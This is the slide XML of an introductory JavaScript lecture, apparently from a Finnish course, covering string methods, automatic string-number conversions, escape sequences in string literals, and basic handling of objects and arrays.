                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>alert</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toUpperCase</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"THIS IS EASY"</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i</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indexOf</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his</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i = 1</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j</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lastIndexOf</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"is"</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j = 5</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charCodeAt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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c = 116</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>s2</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slice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>10</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"is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>w</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split</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 "</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["this", "is", "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>easy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"]</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replace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/s/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g</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"z"</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value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lost</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>s</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s</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replace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/s/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g</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"z"</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thiz</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iz</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eazy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B06090202040302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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5B24EC7-0112-4F0E-B22D-B64AD63F54E2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Automatic Conversions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{76D3315C-1861-49BF-BDF3-9526721D7789}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Concatenation (+) of string and number, causes the number to be converted into string:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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x</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"123"</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4</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x = "1234"</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Arithmetic operation or comparison between string and number causes the string to be converted into number and arithmetic performed</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"123"</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4</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119</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A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"123"</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123</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0, because "" evaluates 0</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A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"foo"</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t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Number.NaN</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A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"123"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;&lt;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49</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Better to use manual conversion:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:b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new</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"123.5"</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 = 123.5</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"123.5"</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same as above</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a</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toString</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 = "123.5";</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new</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123.5</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 = "123.5"</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>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123.5</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same as above</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"cat"</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 = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NaN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0">
              <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0">
              <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{11D078C2-721E-46ED-A558-D6A8FC6E354B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>String Literals</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36867" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{16977FCD-9245-4BD1-8B0F-1EACB457B7F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1809750" y="5805264"/>
            <a:ext cx="8318698" cy="917803"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>closing tags must also be escaped with \ if you use them inside HTML e.g."&lt;\/table&gt;" instead of "&lt;/table&gt;"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Group 79">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D92357F7-F6CC-47B4-97D1-A359B5681A28}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1809750" y="1285875"/>
          <a:ext cx="8215313" cy="4425955"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2435447">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="5779866">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="402815">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1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                        </a:rPr>
                        <a:t>Blacklash Sequence</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1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                        </a:rPr>
                        <a:t>Character represented</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\b</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backspace</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\t</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horizontal tab</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\n</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newline</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\v</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vertical tab</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\f</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form feed</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\r </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carriage return</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double quote</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single quote</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backlash</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\xXX</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Latin-1 character specified by hexadecimal XX</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40">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\uXXXX</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439"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rgbClr val="FFCC00"/>
                        </a:buClr>
                        <a:buSzPct val="55000"/>
                        <a:buFont typeface="Monotype Sorts" pitchFamily="2" charset="2"/>
                        <a:buNone/>
                        <a:tabLst/>
                      </a:pPr>
                      <a:r>
                        <a:rPr kumimoji="0" lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                        </a:rPr>
                        <a:t>Unicode character  specified by hexadecimal XXXX</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91439" marR="91439"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DED9A3CB-F32E-47E0-87FB-980518C0DCCB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Handling Objects</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{85441CA0-3762-4F1E-884E-C53910959843}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1442194"/>
            <a:ext cx="10972800" cy="5141168"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// Create a new instance of an object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1080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>instance</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new</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Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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new</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Array</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100</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Array</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100</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// Access object properties</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>value</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instance</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property</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read</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>instance</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property</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newValue</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write</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FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</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n</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a</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length</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size of an array</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// Use object methods:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>instance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method</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parameters</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a</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push</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add 2 to the end of array</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lastItem</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a</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pop</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get last item</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// Delete an instance (not defined using var, const or let)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1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5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
